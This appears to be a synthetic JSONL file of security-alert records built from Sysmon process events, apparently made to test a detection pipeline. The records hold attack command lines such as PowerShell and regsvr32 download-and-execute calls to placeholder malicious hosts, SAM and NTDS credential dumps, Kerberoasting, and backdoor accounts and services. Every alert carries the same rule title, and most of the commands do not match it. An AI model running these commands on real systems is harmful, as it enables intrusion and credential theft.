{"window_size_minutes":5,"alert_id":"alert-1767814721548540000","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":0.8,"timestamp":"2026-01-07T22:38:41.5394068+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-server.com/payload.ps1')\""},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-server.com/payload.ps1')\"","CurrentDirectory":"C:\\Users\\John\\Downloads\\","FileVersion":"10.0.19041.1","Hashes":"SHA256=A1B2C3D4E5F6071829384756ABCDEF1234567890ABCDEF1234567890ABCDEF12","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-4e2f-5d6a-0000-0020a4b10100}","LogonId":"0x1b1a4","ParentCommandLine":"cmd.exe /c powershell.exe -NoP -NonI","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-4e2e-5d6a-0000-0010c7b10100}","ParentProcessId":"2144","ProcessGuid":"{a23d45b-4f2e-5d6a-0000-0010e8b60100}","ProcessId":"4512","RuleName":"technique_id=T1059.001,technique_name=PowerShell","TerminalSessionId":"1","User":"CORP\\John","UtcTime":"2026-01-02 14:23:45.123"},"System":{"Computer":"workstation01.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-02T14:23:45.123Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":1,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.54854+03:00","rate_per_minute":0.2,"count_trend":"→","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721565892300","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":0.8,"timestamp":"2026-01-07T22:38:41.5490465+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"cmd.exe /c whoami"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"cmd.exe /c whoami","CurrentDirectory":"C:\\inetpub\\wwwroot\\","Hashes":"SHA256=B28D75715A8B3620ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890","Image":"C:\\Windows\\System32\\cmd.exe","IntegrityLevel":"Low","LogonGuid":"{a23d45b-5200-5d6a-0000-0020c4e50500}","LogonId":"0x5e5c4","ParentCommandLine":"c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\"","ParentImage":"c:\\windows\\system32\\inetsrv\\w3wp.exe","ParentProcessGuid":"{a23d45b-5200-5d6a-0000-0010b2d40500}","ParentProcessId":"1024","ProcessGuid":"{a23d45b-5201-5d6a-0000-0010d3f50500}","ProcessId":"5612","RuleName":"technique_id=T1505.003,technique_name=Web Shell","TerminalSessionId":"0","User":"IIS APPPOOL\\DefaultAppPool","UtcTime":"2026-01-02 15:30:05.234"},"System":{"Computer":"web-server01.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-02T15:30:05.234Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":2,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.5664409+03:00","rate_per_minute":0.4,"count_trend":"→","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721578353600","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":0.8,"timestamp":"2026-01-07T22:38:41.5675227+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"net user hacker P@ssw0rd123! /add /domain"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"net user hacker P@ssw0rd123! /add /domain","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA256=E5F6071829384756ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890","Image":"C:\\Windows\\System32\\net.exe","IntegrityLevel":"High","LogonGuid":"{a23d45b-4e1e-5d6a-0000-0020e4030100}","LogonId":"0x3e4","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-5866-5d6a-0000-00102a5a0b00}","ParentProcessId":"3888","ProcessGuid":"{a23d45b-5867-5d6a-0000-0010395b0b00}","ProcessId":"3912","RuleName":"technique_id=T1136.002,technique_name=Domain Account","TerminalSessionId":"0","User":"CORP\\Administrator","UtcTime":"2026-01-02 18:05:12.012"},"System":{"Computer":"dc01.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-02T18:05:12.012Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":3,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.5783536+03:00","rate_per_minute":0.6,"count_trend":"→","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721587645200","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.5783536+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"certutil.exe -decode C:\\temp\\encoded.txt C:\\temp\\malware.exe"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"certutil.exe -decode C:\\temp\\encoded.txt C:\\temp\\malware.exe","CurrentDirectory":"C:\\temp\\","Hashes":"SHA256=F6071829384756ABCDEF1234567890ABCDEF1234567890ABCDEF12345678901A","Image":"C:\\Windows\\System32\\certutil.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-5977-5d6a-0000-00203b6b0c00}","LogonId":"0xc6b3b","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-5976-5d6a-0000-00103c6a0c00}","ParentProcessId":"2144","ProcessGuid":"{a23d45b-5978-5d6a-0000-00104a6c0c00}","ProcessId":"4224","RuleName":"technique_id=T1027,technique_name=Obfuscated Files","TerminalSessionId":"1","User":"CORP\\David","UtcTime":"2026-01-02 18:20:45.345"},"System":{"Computer":"workstation08.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-02T18:20:45.345Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":4,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.5876452+03:00","rate_per_minute":0.8,"count_trend":"↑","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721594965200","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.588158+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"schtasks /create /tn \"WindowsUpdateCheck\" /tr \"C:\\temp\\backdoor.exe\" /sc onlogon /ru SYSTEM"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"schtasks /create /tn \"WindowsUpdateCheck\" /tr \"C:\\temp\\backdoor.exe\" /sc onlogon /ru SYSTEM","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA256=071829384756ABCDEF1234567890ABCDEF1234567890ABCDEF123456789012AB","Image":"C:\\Windows\\System32\\schtasks.exe","IntegrityLevel":"High","LogonGuid":"{a23d45b-5b99-5d6a-0000-00204d8d0e00}","LogonId":"0xe8d4d","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-5b98-5d6a-0000-00105e8c0e00}","ParentProcessId":"2456","ProcessGuid":"{a23d45b-5b9a-5d6a-0000-00106c8e0e00}","ProcessId":"3344","RuleName":"technique_id=T1053.005,technique_name=Scheduled Task","TerminalSessionId":"1","User":"CORP\\Admin","UtcTime":"2026-01-02 19:10:22.901"},"System":{"Computer":"workstation10.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-02T19:10:22.901Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":5,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.5949652+03:00","rate_per_minute":1,"count_trend":"↑","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721602878700","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.5949652+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"cmd.exe /c \"whoami \u0026\u0026 ipconfig \u0026\u0026 net user\""},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"cmd.exe /c \"whoami \u0026\u0026 ipconfig \u0026\u0026 net user\"","CurrentDirectory":"C:\\Users\\Public\\","Hashes":"SHA256=1829384756ABCDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCD","Image":"C:\\Windows\\System32\\cmd.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-5dbb-5d6a-0000-00207f9f1000}","LogonId":"0x109f7f","ParentCommandLine":"wscript.exe C:\\temp\\script.vbs","ParentImage":"C:\\Windows\\System32\\wscript.exe","ParentProcessGuid":"{a23d45b-5dba-5d6a-0000-001070901000}","ParentProcessId":"3344","ProcessGuid":"{a23d45b-5dbc-5d6a-0000-00108ea01000}","ProcessId":"4568","RuleName":"technique_id=T1059.003,technique_name=Windows Command Shell","TerminalSessionId":"2","User":"CORP\\Guest","UtcTime":"2026-01-02 20:05:10.567"},"System":{"Computer":"workstation12.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-02T20:05:10.567Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":6,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.6028787+03:00","rate_per_minute":1.2,"count_trend":"↑","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721611907700","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.6034855+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\temp\\dump\" q q"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\temp\\dump\" q q","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA256=29384756ABCDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF","Image":"C:\\Windows\\System32\\ntdsutil.exe","IntegrityLevel":"High","LogonGuid":"{a23d45b-4e1e-5d6a-0000-0020e4030100}","LogonId":"0x3e4","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-5fdd-5d6a-0000-001092c11200}","ParentProcessId":"4344","ProcessGuid":"{a23d45b-5fde-5d6a-0000-0010a0c21200}","ProcessId":"5432","RuleName":"technique_id=T1003.003,technique_name=NTDS","TerminalSessionId":"0","User":"CORP\\Administrator","UtcTime":"2026-01-02 21:00:15.123"},"System":{"Computer":"dc01.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-02T21:00:15.123Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":7,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.6119077+03:00","rate_per_minute":1.4,"count_trend":"↑","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721625591100","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.618768+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"regsvr32 /s /n /u /i:http://evil-site.com/malicious.sct scrobj.dll"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"regsvr32 /s /n /u /i:http://evil-site.com/malicious.sct scrobj.dll","CurrentDirectory":"C:\\Users\\Anna\\Desktop\\","Hashes":"SHA256=4756ABCDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234","Image":"C:\\Windows\\System32\\regsvr32.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-60ff-5d6a-0000-0020d3e31400}","LogonId":"0x14e3d3","ParentCommandLine":"wscript.exe malicious.js","ParentImage":"C:\\Windows\\System32\\wscript.exe","ParentProcessGuid":"{a23d45b-60fe-5d6a-0000-0010b4e21400}","ParentProcessId":"2344","ProcessGuid":"{a23d45b-6100-5d6a-0000-0010c2e41400}","ProcessId":"4788","RuleName":"technique_id=T1218.010,technique_name=Regsvr32","TerminalSessionId":"1","User":"CORP\\Anna","UtcTime":"2026-01-02 21:50:22.789"},"System":{"Computer":"workstation15.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-02T21:50:22.789Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":8,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.6255911+03:00","rate_per_minute":1.6,"count_trend":"↑","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721634146800","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.6255911+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"C:\\Windows\\system32\\wsmprovhost.exe -Embedding"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"C:\\Windows\\system32\\wsmprovhost.exe -Embedding","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA256=56ABCDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF123456","Image":"C:\\Windows\\System32\\wsmprovhost.exe","IntegrityLevel":"High","LogonGuid":"{a23d45b-6210-5d6a-0000-0020e4041500}","LogonId":"0x1504e4","ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p","ParentImage":"C:\\Windows\\System32\\svchost.exe","ParentProcessGuid":"{a23d45b-4e20-5d6a-0000-0010f5060100}","ParentProcessId":"1084","ProcessGuid":"{a23d45b-6211-5d6a-0000-0010d3f51500}","ProcessId":"5012","RuleName":"technique_id=T1021.006,technique_name=Windows Remote Management","TerminalSessionId":"0","User":"CORP\\RemoteAdmin","UtcTime":"2026-01-02 22:15:10.012"},"System":{"Computer":"workstation16.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-02T22:15:10.012Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":9,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.6341468+03:00","rate_per_minute":1.8,"count_trend":"↑","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721642482800","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":0.8,"timestamp":"2026-01-07T22:38:41.6341468+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"powershell.exe -NoP -NonI -Command \"Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/sqlserver.corp.local'\""},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"powershell.exe -NoP -NonI -Command \"Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/sqlserver.corp.local'\"","CurrentDirectory":"C:\\temp\\","Hashes":"SHA256=6ABCDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-6432-5d6a-0000-002006161700}","LogonId":"0x171606","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-6431-5d6a-0000-0010f8151700}","ParentProcessId":"2788","ProcessGuid":"{a23d45b-6433-5d6a-0000-0010f5171700}","ProcessId":"4224","RuleName":"technique_id=T1558.003,technique_name=Kerberoasting","TerminalSessionId":"1","User":"CORP\\Attacker","UtcTime":"2026-01-02 23:05:33.678"},"System":{"Computer":"dc01.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-02T23:05:33.678Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":10,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.6424828+03:00","rate_per_minute":2,"count_trend":"→","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721651619200","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.6424828+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"net group \"Domain Admins\" /domain"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"net group \"Domain Admins\" /domain","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA256=ABCDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF12345678","Image":"C:\\Windows\\System32\\net.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-6543-5d6a-0000-002017271800}","LogonId":"0x182717","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-6542-5d6a-0000-0010f9261800}","ParentProcessId":"2456","ProcessGuid":"{a23d45b-6544-5d6a-0000-001006281800}","ProcessId":"3912","RuleName":"technique_id=T1087.002,technique_name=Domain Account Discovery","TerminalSessionId":"2","User":"CORP\\User01","UtcTime":"2026-01-02 23:30:22.901"},"System":{"Computer":"workstation18.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-02T23:30:22.901Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":11,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.6516192+03:00","rate_per_minute":2.2,"count_trend":"→","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721656301500","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.6526352+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"reg save HKLM\\SAM C:\\temp\\sam.hive"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"reg save HKLM\\SAM C:\\temp\\sam.hive","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA256=CDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF12345678901","Image":"C:\\Windows\\System32\\reg.exe","IntegrityLevel":"High","LogonGuid":"{a23d45b-4e1e-5d6a-0000-0020e4030100}","LogonId":"0x3e4","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-6987-5d6a-0000-00103d6b1c00}","ParentProcessId":"3912","ProcessGuid":"{a23d45b-6988-5d6a-0000-00104c6c1c00}","ProcessId":"4456","RuleName":"technique_id=T1003.002,technique_name=Security Account Manager","TerminalSessionId":"0","User":"CORP\\Administrator","UtcTime":"2026-01-03 01:15:33.123"},"System":{"Computer":"dc01.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-03T01:15:33.123Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":12,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.6563015+03:00","rate_per_minute":2.4,"count_trend":"→","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721667815100","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.6563015+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"tasklist /v"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"tasklist /v","CurrentDirectory":"C:\\temp\\","Hashes":"SHA256=EF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890123","Image":"C:\\Windows\\System32\\tasklist.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-6ba9-5d6a-0000-00205f8d1e00}","LogonId":"0x1e8d5f","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-6ba8-5d6a-0000-001050.8c1e00}","ParentProcessId":"4788","ProcessGuid":"{a23d45b-6baa-5d6a-0000-00106e8e1e00}","ProcessId":"5244","RuleName":"technique_id=T1057,technique_name=Process Discovery","TerminalSessionId":"1","User":"CORP\\Attacker","UtcTime":"2026-01-03 02:05:55.789"},"System":{"Computer":"workstation23.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-03T02:05:55.789Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":13,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.6678151+03:00","rate_per_minute":2.6,"count_trend":"→","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721677159900","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.6678151+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"sc create EvilService binPath= \"C:\\temp\\backdoor.exe\" start= auto"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"sc create EvilService binPath= \"C:\\temp\\backdoor.exe\" start= auto","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA256=F1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF12345678901234","Image":"C:\\Windows\\System32\\sc.exe","IntegrityLevel":"High","LogonGuid":"{a23d45b-6dcb-5d6a-0000-002081a02000}","LogonId":"0x20a081","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-6dca-5d6a-0000-001072a02000}","ParentProcessId":"1876","ProcessGuid":"{a23d45b-6dcc-5d6a-0000-001090a02000}","ProcessId":"2344","RuleName":"technique_id=T1569.002,technique_name=Service Execution","TerminalSessionId":"1","User":"CORP\\LocalAdmin","UtcTime":"2026-01-03 02:55:45.345"},"System":{"Computer":"workstation25.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-03T02:55:45.345Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":14,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.6771599+03:00","rate_per_minute":2.8,"count_trend":"→","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721682697700","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.6771599+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"nltest /domain_trusts /all_trusts"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"nltest /domain_trusts /all_trusts","CurrentDirectory":"C:\\temp\\","Hashes":"SHA256=1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCD","Image":"C:\\Windows\\System32\\nltest.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-6fed-5d6a-0000-0020a3c12200}","LogonId":"0x22c1a3","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-6fec-5d6a-0000-001094c02200}","ParentProcessId":"3788","ProcessGuid":"{a23d45b-6fee-5d6a-0000-0010b2c22200}","ProcessId":"5012","RuleName":"technique_id=T1482,technique_name=Domain Trust Discovery","TerminalSessionId":"1","User":"CORP\\Attacker","UtcTime":"2026-01-03 03:45:22.901"},"System":{"Computer":"dc01.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-03T03:45:22.901Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":15,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.6826977+03:00","rate_per_minute":3,"count_trend":"↑","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
